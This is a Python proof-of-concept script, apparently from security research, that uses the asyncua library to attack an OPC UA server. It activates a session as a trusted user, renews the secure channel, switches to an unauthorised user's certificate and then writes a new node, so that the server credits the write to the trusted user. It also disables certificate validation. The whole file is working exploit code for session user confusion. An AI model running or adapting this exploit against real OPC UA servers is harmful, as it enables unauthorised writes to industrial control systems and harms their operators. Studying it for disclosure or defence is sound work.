import asyncio
import logging
import sys
import socket
from pathlib import Path

sys.path.insert(0, "venv/kci-session-user-confusion_client")
from asyncua import Client
from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256
from asyncua import ua

logging.basicConfig(level=logging.INFO)
_logger = logging.getLogger(__name__)

# Client's certificate and private key
cert_base = Path(__file__).parent
cert = Path(cert_base / f"client_cert.der")
private_key = Path(cert_base / f"client_key.der")

# User 1 - Trusted user
user1_cert = Path(cert_base / f"user-certificates/user1-cert.der")
user1_private_key = Path(cert_base / f"user-certificates/user1.pem")

# User 2 - Unauthorised user
user2_cert = Path(cert_base / f"user-certificates/user2-cert.der")
user2_private_key = Path(cert_base / f"user-certificates/user2.pem")


async def task(loop):
    client_app_uri = f"urn:open62541.unconfigured.application"
    url = "opc.tcp://user1@Teds-MacBook-Pro.local:4840/freeopcua/server/"

    # Create client and set security policies (Sign-only or Sign and encrypt)
    client = Client(url=url)
    client.application_uri = client_app_uri
    await client.set_security(
        SecurityPolicyBasic256Sha256,
        certificate=str(cert),
        private_key=str(private_key),
        server_certificate = Path(cert_base / f"../server/server_cert.der"),
        #mode =2
    )

    # Load authorised user first to create the initial session
    await client.load_client_certificate(user1_cert, extension="der")
    await client.load_private_key(user1_private_key, extension="pem")

    client.certificate_validator = None  

    # Open channel, create session and read from/write to nodes
    try:
        await client.connect_socket()
        await client.send_hello()
        await client.open_secure_channel()
        # Session created and activated as authorised user
        await client.create_session()
        await client.activate_session(username=client._username, certificate=client.user_certificate)

        # Renews channel, this where attack takes over
        await client.open_secure_channel(renew=True)

        # Loads unauthorised user
        await client.load_client_certificate(user2_cert, extension="der")
        await client.load_private_key(user2_private_key, extension="pem")

        # Creates and activates session as unauthorised user
        await client.create_session()
        await client.activate_session(username=client._username, certificate=client.user_certificate)
        
        # Reopens channel, redirected back to legitimate server
        await client.open_secure_channel(renew=True)

        # Makes a request as user 2 -> Server processes as user 1
        _logger.info("Make a read request. Still User 2.")
        objects = client.nodes.objects
        obj = await objects.add_object(0, "TestNode")

        await client.close_session()
        await client.close_secure_channel()
        client.disconnect_socket()

    except ua.UaError as exp:
        _logger.error(exp)


def main():
    loop = asyncio.get_event_loop()
    loop.set_debug(True)
    try:
        loop.run_until_complete(task(loop))
    finally:
        pending = asyncio.all_tasks(loop)
        for t in pending:
            t.cancel()
        
        loop.run_until_complete(
            asyncio.gather(*pending, return_exceptions=True)
        )
        loop.close()


if __name__ == "__main__":
    main()
